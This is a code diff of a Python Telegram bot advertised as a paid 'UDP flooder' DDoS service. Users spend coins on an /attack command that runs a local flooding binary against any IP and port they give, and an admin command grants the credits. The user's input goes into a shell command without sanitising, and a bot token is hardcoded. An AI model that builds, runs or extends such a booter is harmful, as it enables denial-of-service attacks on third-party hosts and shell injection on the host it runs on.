@@ -1,258 +1,197 @@
 import asyncio
 import subprocess
+import json
+import time
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-import time
 
 # Define Admin ID
-ADMIN_ID = "7962308718"  # Replace with the actual Telegram user ID of the admin 
+ADMIN_ID = "7962308718"  # Replace with the actual Telegram user ID of the admin
 
-# In-memory database to store user balances
+# In-memory database (persistent)
+DATA_FILE = "user_data.json"
 user_data = {}
-start_time = time.time()  # Record bot's start time
+active_attacks = {}
+start_time = time.time()
 
-# Define the /start command
+# Load user data from file
+def load_user_data():
+    global user_data
+    try:
+        with open(DATA_FILE, "r") as f:
+            user_data = json.load(f)
+    except FileNotFoundError:
+        user_data = {}
+
+# Save user data to file
+def save_user_data():
+    with open(DATA_FILE, "w") as f:
+        json.dump(user_data, f, indent=4)
+
+# Load data at startup
+load_user_data()
+
+# Start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     welcome_message = """
 ❄️ *WELCOME TO @RAHUL_DDOS_B BHAI ULTIMATE UDP FLOODER* ❄️
-
 🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥
-
 ✨ *Key Features:* ✨
-🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙠𝙖𝙧𝙤 𝙖𝙥𝙣𝙚 𝙤𝙥𝙥𝙤𝙣𝙚𝙣𝙩𝙨 𝙥𝙖𝙧 𝘽𝙜𝙢𝙞 𝙈𝙚 /attack
-🏦 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 𝙠𝙖 𝙗𝙖𝙡𝙖𝙣𝙘𝙚 𝙖𝙪𝙧 𝙖𝙥𝙥𝙧𝙤𝙫𝙖𝙡 𝙨𝙩𝙖𝙩𝙪𝙨 𝙘𝙝𝙚𝙘𝙠 𝙠𝙖𝙧𝙤 /myinfo
-🤡 𝘼𝙪𝙧 𝙝𝙖𝙘𝙠𝙚𝙧 𝙗𝙖𝙣𝙣𝙚 𝙠𝙚 𝙨𝙖𝙥𝙣𝙤 𝙠𝙤 𝙠𝙖𝙧𝙡𝙤 𝙥𝙤𝙤𝙧𝙖! 😂
-
-⚠️ *Kaise Use Kare?* ⚠️
-Commands ka use karo aur commands ka pura list dekhne ke liye type karo: /help
-
-💬 *Queries or Issues?* 💬
-Contact Admin: @RAHUL_DDOS_B BHAI
+🚀 Attack /attack <ip> <port> <duration>
+🏦 Account check /myinfo
+🛠️ Help /help
 """
     await update.message.reply_text(welcome_message, parse_mode="Markdown")
 
-# Define the /help command
+# Help command
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     help_message = """
 🛠️ RAHUL VIP DDOS Bot Help Menu 🛠️
-
-🌟 Yahan hai sab kuch jo tumhe chahiye! 🌟
-
-📜 Available Commands: 📜
-
+📜 Commands: 📜
 1️⃣ 🔥 /attack <ip> <port> <duration>
-   - Is command ka use karke tum attack laga sakte ho.
-   - Example: /attack 192.168.1.1 20876 240
-   - 📝 Note: Duration 300 seconds se zyada nahi ho sakta.
-
-2️⃣ 💳 /myinfo
-   - Apne account ka status aur coins check karne ke liye.
-   - Example: Tumhare balance aur approval status ka pura details milega.
-
-3️⃣ 🔧 /uptime
-   - Bot ka uptime check karo aur dekho bot kitne der se chal raha hai.
-
-4️⃣ ❓ /help
-   - Ab ye toh tum already use kar rahe ho! Yeh command bot ke saare features explain karta hai.
-
-🚨 𝐈𝐦𝐩𝐨𝐫𝐭𝐚𝐧𝐭 𝐓𝐢𝐩𝐬: 🚨
-- BOT REPLY NAA DE ISKA MATLAB KOI AUR BNDA ATTACK LAGYA HAI SO WAIT.
-- Agar koi dikkat aaye toh admin ko contact karo: @RAHUL_DDOS_B BHAI
-
-💥 Ab jao aur hacker banne ka natak shuru karo! 💥
+2️⃣ 💳 /myinfo - Check balance.
+3️⃣ 🔧 /uptime - Bot uptime.
+4️⃣ ❓ /help - View help.
+5️⃣ 🗑️ /remove <user_id> - Admin only (remove user).
+🚨 *BOT REPLY NAA DE ISKA MATLAB KOI AUR ATTACK KAR RHA HAI!* 🚨
 """
     await update.message.reply_text(help_message, parse_mode="Markdown")
 
-# Data placeholders
-user_data = {}  # User data with balances
-active_attacks = {}  # Tracks active attacks
+# My Info command
+async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    user_id = str(update.effective_user.id)
+    balance = user_data.get(user_id, {}).get("balance", 0)
+    await update.message.reply_text(f"💰 Coins: {balance}\n😏 Status: Approved", parse_mode="Markdown")
 
+# Attack command
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.effective_user.id)
 
-    # Check if user is registered
     if user_id not in user_data:
-        await update.message.reply_text(
-            "💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂"
-        )
+        await update.message.reply_text("💰 Bhai, tere paas toh coins nahi hai! Pehle admin se baat kar.")
         return
 
-    # Check if the user is already running an attack
-    if user_id in active_attacks:
-        remaining_time = active_attacks[user_id]
-        await update.message.reply_text(
-            f"⚠️ Arre bhai, ruk ja! Ek aur attack chal raha hai. "
-            f"Attack khatam hone mein {remaining_time} seconds bache hain."
-        )
+    if user_id in active_attacks and time.time() < active_attacks[user_id]:
+        remaining_time = int(active_attacks[user_id] - time.time())
+        await update.message.reply_text(f"⚠️ Attack already running! {remaining_time} seconds left.")
         return
 
-    # Parse and validate command arguments
     if len(context.args) != 3:
-        error_message = """
-❌ *Usage galat hai!* Command ka sahi format yeh hai:
-👉 `/attack <ip> <port> <duration>`
-📌 *Example:* `/attack 192.168.1.1 26547 240`
-"""
-        await update.message.reply_text(error_message, parse_mode="Markdown")
+        await update.message.reply_text("❌ Usage: /attack <ip> <port> <duration>", parse_mode="Markdown")
         return
 
-    ip = context.args[0]
-    port = context.args[1]
+    ip, port = context.args[0], context.args[1]
     try:
         duration = int(context.args[2])
         if duration > 300:
-            await update.message.reply_text(
-                "⛔ Limit cross mat karo! Tum sirf 300 seconds tak attack kar sakte ho.\n"
-                "Agar zyada duration chahiye toh admin se baat karo! 😎"
-            )
+            await update.message.reply_text("⛔ Maximum duration is 300 seconds.")
             return
     except ValueError:
-        await update.message.reply_text("❌ Duration ek valid number hona chahiye.")
+        await update.message.reply_text("❌ Duration must be a valid number.")
         return
 
-    # Deduct coins for the attack
-    attack_cost = 5  # Cost of the attack
-    user_balance = user_data.get(user_id, {}).get("balance", 0)
-
-    if user_balance < attack_cost:
-        await update.message.reply_text(
-            "💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂"
-        )
+    attack_cost = 5
+    if user_data[user_id]["balance"] < attack_cost:
+        await update.message.reply_text("💰 Coins insufficient! Contact admin.")
         return
 
-    # Deduct coins and update balance
     user_data[user_id]["balance"] -= attack_cost
-    remaining_balance = user_data[user_id]["balance"]
+    save_user_data()
 
-    # Attack initiation message
-    attack_message = f"""
-🚀 *[ATTACK INITIATED]* 🚀
+    active_attacks[user_id] = time.time() + duration
 
-💣 *Target IP:* {ip}
-🔢 *Port:* {port}
-🕒 *Duration:* {duration} seconds
-💰 *Coins Deducted:* {attack_cost}
-📉 *Remaining Balance:* {remaining_balance}
+    await update.message.reply_text(
+        f"🚀 *Attack Started*\n💣 Target: {ip}:{port}\n⏳ Duration: {duration}s\n💰 Balance Left: {user_data[user_id]['balance']}",
+        parse_mode="Markdown"
+    )
 
-🔥 *Attack chal raha hai! Chill kar aur enjoy kar!* 💥
-"""
-    await update.message.reply_text(attack_message, parse_mode="Markdown")
-
-    # Mark the user as active and track the remaining time
-    active_attacks[user_id] = duration
-
-    # Execute attack command
     try:
-        process = subprocess.Popen(
-            f"./Rahul {ip} {port} {duration} 1000",  # Replace with actual attack tool command
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE
-        )
-        stdout, stderr = process.communicate()
-
-        # Debugging output
-        if stdout:
-            print(f"[INFO] {stdout.decode()}")
-        if stderr:
-            print(f"[ERROR] {stderr.decode()}")
+        process = subprocess.Popen(f"./Rahul {ip} {port} {duration} 900", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process.communicate()
 
         if process.returncode != 0:
-            await update.message.reply_text(
-                "❌ Attack failed! Command execution error."
-            )
+            await update.message.reply_text("❌ Attack failed!")
             del active_attacks[user_id]
             return
-
     except Exception as e:
-        await update.message.reply_text(f"❌ Attack failed: {e}")
+        await update.message.reply_text(f"❌ Attack error: {e}")
         del active_attacks[user_id]
         return
 
-    # Simulate the attack duration
-    while active_attacks[user_id] > 0:
+    while time.time() < active_attacks[user_id]:
         await asyncio.sleep(1)
-        active_attacks[user_id] -= 1
 
-    # Remove user from active attacks after completion
     del active_attacks[user_id]
 
-    # Attack completion message
-    complete_message = f"""
-✅ *[ATTACK FINISHED]* ✅
+    await update.message.reply_text(
+        f"✅ *[ATTACK FINISHED]* ✅\n\n"
+        f"💣 *Target:* `{ip}:{port}`\n"
+        f"🕒 *Duration:* {duration} seconds\n"
+        f"💰 *Remaining Coins:* {user_data[user_id]['balance']}\n"
+        f"🔥 *Attack complete! Chill kar!* 🚀",
+        parse_mode="Markdown"
+    )
 
-💣 *Target IP:* {ip}
-🔢 *Port:* {port}
-🕒 *Duration:* {duration} seconds
-
-💥 *Attack complete! Ab chill kar aur feedback bhej!* 🚀
-"""
-    await update.message.reply_text(complete_message, parse_mode="Markdown")
-
-# Define the /devil command (Admin-only)
+# Admin command to set user balance
 async def devil(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.effective_user.id)
-    
-    # Check if the user is the admin
+
     if user_id != ADMIN_ID:
-        await update.message.reply_text("🖕 Chal nikal! Tera aukaat nahi hai yeh command chalane ki. Admin se baat kar pehle.")
+        await update.message.reply_text("❌ Only admin can use this command!")
         return
 
     if len(context.args) != 2:
-        await update.message.reply_text("Usage: /rahul <user_id> <balance>")
+        await update.message.reply_text("Usage: /devil <user_id> <balance>")
         return
 
     target_user_id = context.args[0]
     try:
         balance = int(context.args[1])
     except ValueError:
-        await update.message.reply_text("Please enter a valid numeric balance.")
+        await update.message.reply_text("❌ Enter a valid numeric balance.")
         return
 
-    # Add user to the system with the specified balance
     user_data[target_user_id] = {"balance": balance}
-    await update.message.reply_text(
-        f"✅ User with ID {target_user_id} added with balance {balance}."
-    )
+    save_user_data()
+    await update.message.reply_text(f"✅ User {target_user_id} set with balance {balance}.")
 
-# Define the /myinfo command
-async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+# Admin command to remove a user
+async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.effective_user.id)
-    if user_id in user_data:
-        balance = user_data[user_id]["balance"]
-        await update.message.reply_text(
-            f"""📝 Tera info check kar le, Gandu hacker:
-💰 Coins: {balance}
-😏 Status: Approved
-Ab aur kya chahiye? Hacker banne ka sapna toh kabhi poora hoga nahi!""",
-            parse_mode="Markdown"
-        )
-    else:
-        await update.message.reply_text(
-            """📝 Tera info check kar le, chutiye hacker:
-💰 Coins: 0
-😏 Status: Approved
-Ab aur kya chahiye? Hacker banne ka sapna toh kabhi poora hoga nahi!""",
-            parse_mode="Markdown"
-        )
 
-# Define the /uptime command
+    if user_id != ADMIN_ID:
+        await update.message.reply_text("❌ Only admin can remove users!")
+        return
+
+    if len(context.args) != 1:
+        await update.message.reply_text("Usage: /remove <user_id>")
+        return
+
+    target_user_id = context.args[0]
+
+    if target_user_id in user_data:
+        del user_data[target_user_id]
+        save_user_data()
+        await update.message.reply_text(f"🗑️ User {target_user_id} has been removed.")
+    else:
+        await update.message.reply_text("❌ User not found.")
+
+# Uptime command
 async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    elapsed_time = time.time() - start_time
+    elapsed_time = int(time.time() - start_time)
     hours, rem = divmod(elapsed_time, 3600)
     minutes, seconds = divmod(rem, 60)
-    await update.message.reply_text(
-        f"⏰ Bot uptime: {int(hours)} hours, {int(minutes)} minutes, {int(seconds)} seconds."
-    )
+    await update.message.reply_text(f"⏰ Bot uptime: {hours}h {minutes}m {seconds}s.")
 
-# Main function to set up the bot
+# Main function
 def main():
     app = ApplicationBuilder().token("7899116336:AAFpQShCGfNYG9WMZe8gioeELSpxs2wGPJk").build()
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_command))
     app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("rahull", devil))
+    app.add_handler(CommandHandler("devil", devil))
+    app.add_handler(CommandHandler("remove", remove_user))
     app.add_handler(CommandHandler("myinfo", myinfo))
     app.add_handler(CommandHandler("uptime", uptime))
 
